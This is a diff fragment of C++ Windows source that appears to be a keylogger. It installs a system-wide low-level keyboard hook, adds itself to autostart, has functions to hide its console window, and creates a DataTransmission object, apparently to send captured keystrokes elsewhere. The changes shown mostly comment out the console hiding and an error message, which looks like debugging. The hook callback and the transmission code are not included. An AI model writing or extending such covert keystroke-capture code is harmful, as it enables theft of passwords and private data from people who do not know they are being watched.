@@ -316,12 +316,18 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
 
 void hideConsoleWindow()
 {
-    ShowWindow(GetConsoleWindow(),SW_HIDE);
+    HWND hwnd = GetConsoleWindow();
+    //SetForegroundWindow(hwnd);
+    //hwnd = GetForegroundWindow();
+    ShowWindow(hwnd,SW_HIDE);
 }
 
 void showConsoleWindow()
 {
-    ShowWindow(GetConsoleWindow(),SW_SHOW);
+    HWND hwnd = GetConsoleWindow();
+    //SetForegroundWindow(hwnd);
+    //hwnd = GetForegroundWindow();
+    ShowWindow(hwnd,SW_SHOW);
 }
 
 void addToAutostart()
@@ -352,8 +358,8 @@ int main()
 {
     //sets dpi process awareness to prevent the getsystemmetrics functions from returning false values
     SetProcessDPIAware();
-    SetConsoleOutputCP(CP_UTF8);
-    hideConsoleWindow();
+    //SetConsoleOutputCP(CP_UTF8);
+    //hideConsoleWindow();
 
     addToAutostart();
 
@@ -368,9 +374,10 @@ int main()
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
     if (hHook == NULL)
     {
-        std::cerr << "Keyboard hook failed!" << std::endl;
+        //std::cerr << "Keyboard hook failed!" << std::endl;
         return 1;
     }
+
 
 
     DataTransmission dt = DataTransmission();
